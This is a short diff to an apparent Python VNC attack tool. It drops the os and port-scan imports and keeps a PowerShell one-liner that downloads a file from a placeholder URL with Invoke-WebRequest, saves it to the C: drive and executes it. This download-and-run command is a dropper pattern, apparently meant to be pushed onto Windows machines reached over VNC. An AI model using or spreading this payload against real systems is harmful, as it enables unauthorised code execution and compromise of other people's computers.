@@ -1,5 +1,4 @@
-import asyncio,asyncvnc,time,os,pyfiglet
-from portscan import PortScan
+import asyncio,asyncvnc,time,pyfiglet
 from colorama import init
 init()
 oneliner = r'''powershell -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'FILE_URL' -OutFile 'C:\FILE_NAME'; C:\FILE_NAME"'''
